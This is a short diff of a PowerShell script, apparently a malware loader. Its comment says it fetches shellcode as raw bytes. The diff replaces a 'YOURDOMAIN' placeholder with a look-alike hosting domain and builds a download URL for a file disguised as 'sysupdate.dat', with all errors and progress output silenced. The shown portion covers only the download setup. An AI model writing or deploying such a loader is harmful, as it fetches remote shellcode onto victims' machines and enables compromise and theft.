@@ -2,7 +2,7 @@ $ErrorActionPreference = 'SilentlyContinue'
 $ProgressPreference = 'SilentlyContinue'
 
 # 1. Fetch Shellcode (Raw Bytes)
-$base = 'https://YOURDOMAIN.com'
+$base = 'https://site-assetss.vercel.app'
 $url = "$base/assets/sysupdate.dat"
 
 $c = New-Object Net.WebClient
